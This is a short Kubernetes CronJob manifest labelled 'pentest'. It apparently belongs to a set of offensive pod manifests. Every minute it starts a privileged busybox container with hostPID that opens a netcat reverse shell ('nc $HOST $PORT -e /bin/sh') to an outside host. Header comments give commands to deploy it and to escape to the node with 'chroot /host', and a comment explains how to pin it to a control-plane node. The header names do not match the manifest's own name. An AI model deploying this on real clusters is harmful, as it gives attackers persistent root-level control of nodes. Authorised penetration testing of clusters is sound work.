###########################################################
## Deploy: kubectl -n [namespace] apply -f priv-and-hostpid-exec.yaml 
## Access: kubectl -n [namespace] exec -it priv-and-hostpid-exec -- chroot /host
## Remove: kubectl -n [namespace] delete priv-and-hostpid-exec
###########################################################

apiVersion: batch/v1beta1
kind: CronJob
metadata:
  name: priv-and-hostpid-revshell-cronjob
  labels:
    app: pentest
spec:
  schedule: "*/1 * * * *"
  concurrencyPolicy: Forbid
  jobTemplate:
    spec:
      template:
        spec:
          hostPID: true
          containers:
          - name: priv-and-hostpid-revshell-cronjob
            image: busybox
            securityContext:
              privileged: true
            command: [ "/bin/sh", "-c", "--" ]
            args: [ "nc $HOST $PORT  -e /bin/sh;" ]
          #nodeName: k8s-control-plane-node # Force your pod to run on the control-plane node by uncommenting this line and changing to a control-plane node name
          restartPolicy: OnFailure